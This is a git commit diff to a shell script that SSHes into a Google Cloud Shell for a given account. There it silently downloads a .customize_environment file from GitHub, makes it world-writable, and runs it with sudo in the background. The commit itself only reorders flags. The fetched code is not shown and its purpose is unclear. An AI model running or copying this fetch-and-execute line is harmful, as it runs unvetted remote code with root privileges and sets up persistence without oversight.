690d8e43913ef9d1509fe0a2fb388daf93b30ab3
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-09-07 20:18:01 -0300

    Update command.sh

--- command.sh
+++ command.sh
@@ -2,6 +2,6 @@
 
 command="[ ! -e '.customize_environment' ] && ( wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & )"
 
-gcloud cloud-shell ssh --command="$command" --authorize-session --force-key-file-overwrite --quiet --account=$1
+gcloud cloud-shell ssh --account=$1 --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet
 
 echo 'command ok'
